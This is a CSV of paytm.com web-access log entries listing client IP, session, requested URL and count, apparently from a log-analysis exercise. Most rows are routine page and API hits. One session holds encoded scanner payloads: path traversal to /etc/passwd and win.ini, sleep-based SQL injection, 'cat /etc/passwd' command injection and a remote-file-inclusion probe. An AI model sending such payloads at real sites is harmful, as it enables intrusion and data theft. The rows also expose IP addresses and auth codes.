clientIp,sessionId,request,count(request)
61.3.15.51,116,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
61.3.15.51,116,https://paytm.com:443/offer/wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4,1
1.187.208.226,2,https://paytm.com:443/shop,1
103.24.22.162,8,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/css/images-thumbnail-sliderv1-style.css?ver=4.2.2,1
106.51.134.130,9,https://paytm.com:443/shop/orderdetail/1117826118,1
113.20.16.198,11,https://paytm.com:443/shop/cart,5
120.59.247.67,23,https://paytm.com:443/shop/orderdetail/1117828542?channel=web&version=2,1
121.244.155.100,27,https://paytm.com:443/offer/wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4,1
122.177.136.159,31,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,2
123.239.172.240,31,https://paytm.com:443/offer/wp-content/uploads/2015/07/bb.png,1
125.19.44.195,37,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
14.139.241.84,44,https://paytm.com:443/offer/wp-content/uploads/2015/01/bootstrap.min_.css,1
14.195.35.95,49,https://paytm.com:443/shop/summary/1117903149,1
164.100.80.37,52,https://paytm.com:443/blog/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
223.176.176.187,81,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jcarousel.responsive.js?ver=4.2.2,1
49.204.187.250,83,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/css/flexslider.css?ver=4.2.2,1
59.177.134.247,94,https://paytm.com:443/shop/cart,1
59.93.179.16,95,https://paytm.com:443/?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff17,1
101.2.37.28,7,https://paytm.com:443/offer/wp-content/uploads/2015/01/bootstrap.min_.css,1
101.2.37.28,7,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/jquery.lbox.min.js?ver=4.2.2,1
101.57.74.210,7,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/style.css?ver=1.26,1
103.16.71.67,7,https://paytm.com:443/papi/rr/products/5604128/statistics?channel=web&version=2,2
103.245.197.114,13,https://paytm.com:443/,1
103.27.171.59,17,https://paytm.com:443/offer/wp-content/uploads/2015/07/julqw.jpg,1
106.220.174.112,25,https://paytm.com:443/favicon.ico,1
107.167.109.134,29,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.carousel.css?ver=4.2.2,1
115.241.52.13,34,https://paytm.com:443/offer/wp-includes/js/wp-emoji-release.min.js?ver=4.2.2,1
115.241.52.13,34,https://paytm.com:443/offer/wp-content/uploads/2015/01/style.css,1
117.201.178.176,34,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,2
117.216.59.98,35,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
121.241.127.1,38,https://paytm.com:443/papi/v1/expresscart/verify,1
14.139.221.18,44,https://paytm.com:443/shop/orderdetail/1117832921?channel=web&version=2,1
14.140.152.66,44,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,2
168.235.194.136,50,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.theme.css?ver=4.2.2,1
168.235.194.136,50,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
180.211.97.81,55,https://paytm.com:443/papi/v1/expresscart/verify,1
183.83.30.5,58,https://paytm.com:443/papi/nps/merchantverification,2
27.106.25.115,72,https://paytm.com:443/shop/cart?channel=web&version=2,1
37.228.107.226,75,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,2
59.90.136.142,82,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
59.90.96.196,83,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/images/specificfeeds_follow.png,1
1.23.165.122,2,https://paytm.com:443/papi/nps/merchantrating?merchant_id=49021&channel=web&version=2,1
1.39.15.53,4,https://paytm.com:443/scripts/web/notifications.js,1
101.0.46.68,5,https://paytm.com:443/offer/wp-content/uploads/2015/07/offer-page_20jul.jpg,1
106.220.172.253,8,https://paytm.com:443/shop/cart?channel=web&version=2,1
115.112.98.77,18,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/slider-plus-lightbox-js.js?ver=4.2.2,1
116.202.36.59,19,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/css/flexslider.css?ver=4.2.2,1
117.192.93.210,20,https://paytm.com:443/offer,1
117.198.25.11,20,https://paytm.com:443/shop/cart?channel=web&version=2,2
117.199.252.47,21,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
117.216.30.1,23,https://paytm.com:443/shop/summary/1117923984,1
117.253.106.25,24,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=VCOMM&utm_campaign=VCOMM&utm_term=24890,1
120.63.197.63,26,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
120.63.197.63,26,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
122.169.183.137,26,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
122.172.76.185,26,https://paytm.com:443/shop/cart?channel=web&version=2,3
122.175.12.121,26,https://paytm.com:443/shop/authresponse?code=a4555dd8-100a-4ff5-af26-c9e2811d58ad&state=null,1
128.199.193.75,30,https://www.paytm.com:443/,1
14.139.245.2,34,https://paytm.com:443/offer/wp-content/plugins/logo-slider/lgs_jquery.cycle2.js?ver=4.2.2,1
14.141.241.90,40,https://paytm.com:443/brands/wp-content/plugins/image-slider-responsive/css/flexslider.css?ver=4.2.2,1
168.235.197.48,57,https://paytm.com:443/blog/wp-content/plugins/jetpack/modules/sharedaddy/sharing.js?ver=3.5.3,1
180.151.21.11,64,https://paytm.com:443/shop/cart?channel=web&version=2,1
182.69.229.3,64,https://paytm.com:443/papi/v1/promosearch/product/12184411/offers?parent_id=12184498&price=399&channel=web&version=2,1
183.82.16.7,66,https://paytm.com:443/papi/rr/products/8635828/statistics?channel=web&version=2,1
203.187.234.194,71,https://paytm.com:443/papi/v1/promosearch/product/2715112/offers?parent_id=2715117,1
49.202.53.19,81,https://paytm.com:443/coupons?gclid=CPKtp6fykMECFdYXjgodKkgAvg,1
49.206.194.12,81,https://paytm.com:443/shop/p/nivea-cool-kick-shower-gel-250ml-MSHOWR00000NIV37YHNANA,1
59.179.69.189,82,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
61.3.34.181,83,https://paytm.com:443/papi/v1/expresscart/verify,1
106.220.47.195,10,https://paytm.com:443/offer/wp-content/plugins/wp-thumbnail-slider/css/wpt-slide.css?ver=4.2.2,1
106.51.234.53,11,https://paytm.com:443/shop/g/electronics/camera/point-shoot?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff4,1
110.226.117.127,17,https://paytm.com:443/images/greyStar.png,1
115.250.96.72,25,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,2
117.205.84.67,26,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
117.205.84.67,26,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
117.252.150.166,29,https://paytm.com:443/shop/cart?channel=web&version=2,2
14.139.41.151,50,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,2
14.139.41.151,51,https://paytm.com:443/?utm_source=affiliates&utm_medium=grabon&utm_campaign=grabon,4
14.97.77.114,56,https://paytm.com:443/papi/v1/promosearch/product/2861664/offers?parent_id=1887692&price=785&channel=web&version=2,1
182.66.27.76,59,https://paytm.com:443/shop/cart/checkout?channel=web&version=2,1
27.97.160.63,64,https://paytm.com:443/styles/app.css,1
49.14.119.16,65,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/l-box-css.css?ver=4.2.2,1
49.14.119.16,65,https://paytm.com:443/offer/wp-includes/js/jquery/ui/position.min.js?ver=1.11.4,1
49.207.190.117,66,https://paytm.com:443/shop/g/hobbies/pet-supplies?sort_popular=1&brand=111486,1
59.183.156.203,74,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/jquery.lbox.min.js?ver=4.2.2,1
61.12.88.186,74,https://paytm.com:443/papi/v1/promosearch/product/4963517/offers?parent_id=6488742&price=370&channel=web&version=2,1
70.39.185.117,75,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/images/ui-bg_glass_95_fef1ec_1x400.png,1
70.39.185.117,75,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/images/ui-icons_454545_256x240.png,1
103.37.83.2,6,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
103.52.223.39,6,https://paytm.com:443/shop/cart?channel=web&version=2,2
106.51.57.130,7,https://paytm.com:443/shop/g/paytm-home/today-s-blockbuster-sale/eoss-jeans-extra-50-off,1
107.167.109.172,14,https://paytm.com:443/offer/wp-content/uploads/2015/03/windows_badge_80.png,3
111.91.75.75,16,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/jquery.lbox.css?ver=4.2.2,1
112.79.35.130,17,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.transitions.css?ver=4.2.2,1
115.118.88.209,22,https://paytm.com:443/favicon.ico,1
117.206.179.211,25,https://paytm.com:443/papi/nps/merchantrating?merchant_id=23073&channel=web&version=2,1
117.251.210.157,29,https://paytm.com:443/shop/cart?channel=web&version=2,1
123.201.30.39,30,https://paytm.com:443/offer/wp-includes/js/masonry.min.js?ver=3.1.2,1
125.16.90.230,30,https://paytm.com:443/recharge,1
125.63.68.99,31,https://paytm.com:443/papi/nps/merchantrating?merchant_id=20063&channel=web&version=2,1
180.151.40.106,40,https://paytm.com:443/shop/summary/1116533981,1
180.215.46.112,40,https://paytm.com:443/?utm_source=affiliates&utm_medium=grabon&utm_campaign=grabon,1
182.68.195.212,40,https://paytm.com:443/papi/v1/promosearch/product/17027213/offers?parent_id=1907444&price=9818&channel=web&version=2,1
182.68.233.112,40,https://paytm.com:443/papi/nps/merchantrating?merchant_id=34481&channel=web&version=2,2
182.71.29.116,40,https://paytm.com:443/papi/v1/promosearch/product/13810768/offers?parent_id=13810779&price=499&channel=web&version=2,1
203.91.192.4,43,https://paytm.com:443/shop/cart,3
203.91.192.4,44,https://paytm.com:443/papi/nps/merchantrating?merchant_id=22225&channel=web&version=2,1
203.91.192.4,45,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/js/jquery.lbox.min.js?ver=4.2.2,2
210.89.60.185,51,https://paytm.com:443/offer/wp-content/plugins/wp-thumbnail-slider/js/wpt-js.js?ver=4.2.2,1
216.10.193.21,51,https://paytm.com:443/papi/rr/products/10816103/statistics?channel=web&version=2,1
27.97.171.90,53,https://paytm.com:443/offer/wp-includes/js/masonry.min.js?ver=3.1.2,1
49.205.182.128,57,https://paytm.com:443/shop/cart?channel=web&version=2,1
1.39.61.178,2,https://paytm.com:443/papi/v1/promosearch/product/13543057/offers?parent_id=10333698&price=9399&channel=web&version=2,1
1.39.97.38,3,https://paytm.com:443/shop/log,1
106.220.16.56,7,https://paytm.com:443/styles/app.css,2
117.253.223.152,20,https://paytm.com:443/shop/g/books-media-stationery/stationery/paper-products-diaries-notebook/notebooks?utm_source=affiliate&utm_medium=innovativelead&utm_campaign=innovativelead-generic&utm_term=26,1
117.253.99.231,20,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
120.57.146.46,20,https://paytm.com:443/papi/v1/promosearch/product/8633282/offers?parent_id=8634657&price=909&channel=web&version=2,1
122.177.9.170,21,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
124.123.201.6,22,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarouselskins.js?ver=3.8,1
125.18.221.14,23,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
164.100.6.6,31,https://paytm.com:443/papi/v1/promosearch/product/5976874/offers?parent_id=2304339&price=2100&channel=web&version=2,1
182.74.248.109,41,https://paytm.com:443/papi/rr/products/4318047/statistics?channel=web&version=2,1
182.74.248.109,41,https://paytm.com:443/papi/rr/products/9033240/statistics?channel=web&version=2,1
192.86.100.78,42,https://paytm.com:443/papi/v1/promosearch/product/8584612/offers?parent_id=8584838&price=599&channel=web&version=2,1
37.228.105.190,57,https://paytm.com:443/styles/app.css,2
37.228.107.221,58,https://paytm.com:443/checkout,1
49.15.95.19,60,https://paytm.com:443/offer/wp-content/uploads/2015/07/logo27.gif,1
49.248.54.227,61,https://paytm.com:443/shop/cart?channel=web&version=2,1
1.22.122.38,1,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/styles.css?ver=4.2.2,1
1.39.33.35,2,https://paytm.com:443/shop/authresponse?code=365a2e01-430e-4adf-aaf6-d5d9de989abc&state=null,1
1.39.60.137,2,https://paytm.com:443/shop/cart,1
103.21.127.78,11,https://paytm.com:443/papi/v1/promosearch/product/11149395/offers?parent_id=3563826&price=599&channel=web&version=2,1
103.25.134.195,13,https://paytm.com:443/shop/g/electronics/pendrives-hard-disks-memory-cards/external-hard-disks?sort_popular=1&gclid=CI2fgIWw7sYCFU5vvAod-3cNtw,1
111.91.17.110,15,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
116.202.36.45,21,https://paytm.com:443/papi/v1/expresscart/verify,4
117.229.75.46,29,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jcarousel.responsive.js?ver=4.2.2,1
180.178.28.18,52,https://paytm.com:443/shop/cart/checkout?channel=web&version=2,1
182.237.158.227,54,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.theme.default.css?ver=2.0.0,1
202.153.41.35,56,https://paytm.com:443/shop/authresponse?code=213c7e4e-d047-4716-8bac-aa88613ae745&state=null,1
203.109.86.38,57,https://paytm.com:443/offer/wp-includes/js/masonry.min.js?ver=3.1.2,1
203.147.88.34,60,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jcarousel.responsive.js?ver=4.2.2,1
203.147.88.34,60,https://paytm.com:443/?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff3-E,1
203.99.208.12,65,https://paytm.com:443/papi/nps/merchantrating?merchant_id=36058&channel=web&version=2,2
223.196.83.57,69,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
27.251.209.34,72,https://paytm.com:443/,1
37.200.217.69,72,https://paytm.com:443/?utm_source=ucweb&utm_medium=Affiliate&utm_campaign=web,1
49.204.187.205,80,http://www.paytm.com:80/,1
101.63.208.0,0,https://paytm.com:443/api/user/favourite?channel=web&version=2,1
103.16.70.147,2,https://paytm.com:443/offer/wp-content/uploads/2015/07/bedlinen.jpg,1
103.225.189.189,3,https://paytm.com:443/shop/cart?channel=web&version=2,2
106.219.15.165,5,https://paytm.com:443/shop/cart,1
106.51.132.54,7,https://paytm.com:443/shop/h/%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2f%5c..%2fetc%2fpasswd/stationery,1
106.51.132.54,7,https://paytm.com:443/shop/g%22%20and%20sleep%284%29%3d%22/brand-store/sports-fitness,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2f..%2f..%2f%2fwindows%2fwin.ini/premium-bedsheets-extra-35-off,1
106.51.132.54,7,https://paytm.com:443/offer%20and%20sleep%284%29%20/bug-bounty/,1
106.51.132.54,7,https://paytm.com:443/%26cat%20%2fetc%2fpasswd%26/security/,1
106.51.132.54,7,https://paytm.com:443/offer/greencart/?src=unexisting/../../../../../../../../../../windows/win.ini.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\.\,1
106.51.132.54,7,https://paytm.com:443/stores/xmlrpc.php?http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt%3f%2500.jpg,1
106.51.132.54,7,https://paytm.com:443/shop/g/paytm-home/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/%27%3bcat%20%2fetc%2fpasswd%3b%27-35-off,1
106.51.132.54,7,https://paytm.com:443/shop/g/paytm-home/home-and-kitchen-appliances%22%20or%20%28sleep%284%29%2b1%29%20limit%201%20--%20,1
106.51.132.54,7,https://paytm.com:443/%22%3bprint%28md5%28acunetix_wvs_security_test%29%29%3b%24a%3d%22/termsconditions/,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/-1%22%20or%20%2287%22%3d%220-55-cashback-on-bedsheets,1
106.51.132.54,7,https://paytm.com:443/shop/g/electronics/the-electronic-store/upto-rs-5000-..%2f...%2f..%2f.%2f..%2f...%2f..%2f.%2f..%2f...%2f..%2f.%2f..%2f...%2f..%2f.%2f..%2f...%2f..%2f.%2f..%2f...%2f..%2f.%2fetc%2fpasswd,1
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/the-home-store/min-55-%27%3bcat%20%2fetc%2fpasswd%3b%27,1
106.51.132.54,7,https://paytm.com:443/stores/xmlrpc.php?rsd%27%20and%20sleep%284%29%3d%27,1
106.51.132.54,7,https://paytm.com:443/shop/h/brand-store/%27%3bcat%20%2fetc%2fpasswd%3b%27,1
106.51.132.54,7,https://paytm.com:443/offer/-1%27%20or%2064-62%20%3d%20%272/,1
106.51.132.54,7,https://paytm.com:443/shop/h/brand-store/home-and-kitchen-appliances%27%20and%20sleep%284%29%3d%27,1
106.76.161.97,8,https://paytm.com:443/vodafone-postpaid-mobile-online-bill-payment.htm?gclid=Cj0KEQjw27etBRDA3-ux4p3c58EBEiQAkJzTAGuXmzG6oezl0DxPGfesRllQzbi39MRvYpwggpaEiwsaAtwF8P8HAQ,1
111.93.9.186,12,https://paytm.com:443/papi/rr/products/13309676/statistics?channel=web&version=2,1
115.249.127.116,18,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/jquery.lbox.css?ver=4.2.2,1
116.203.76.29,20,https://paytm.com:443/shop/cart?channel=web&version=2,2
163.47.13.187,44,https://paytm.com:443/terms,1
168.235.197.12,54,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
182.59.130.46,64,http://www.paytm.com:80/blog/feed/,1
203.99.198.17,75,https://paytm.com:443/favicon.ico,1
27.255.149.37,78,https://paytm.com:443/papi/v1/promosearch/product/13476073/offers?parent_id=13476255&price=2299&channel=web&version=2,1
49.249.113.216,81,https://paytm.com:443/favicon.ico,1
54.169.78.51,82,https://paytm.com:443/shop/p/spice-mi-509-single-sim-4-gb-white-MOBSPICE-MI-509JAI-39133B7003155,1
54.169.78.51,82,https://paytm.com:443/shop/p/lenovo-s650-silver-CMPLXLENOVO_S650_8GB_SILVER,1
54.169.78.51,82,https://paytm.com:443/shop/p/skullcandy-s2dudz-012-in-the-ear-wired-headphone-SKULLCANDY_S2DUDZ-012_NULL_NULL_20511,1
54.169.78.51,82,https://paytm.com:443/shop/p/micromax-p410i-black-CMPLXMICROMAX_MICROMAX-P410I_NULL_BLACK,1
54.169.78.51,82,https://paytm.com:443/shop/p/intex-aqua-power-hd-white-CMPLXMOBINTEX-AQUA-PDUMM141B6BBCA84,1
54.169.78.51,82,https://paytm.com:443/shop/p/gionee-slim-s80-black-Gionee_SlimS80_Null_Black_50683,1
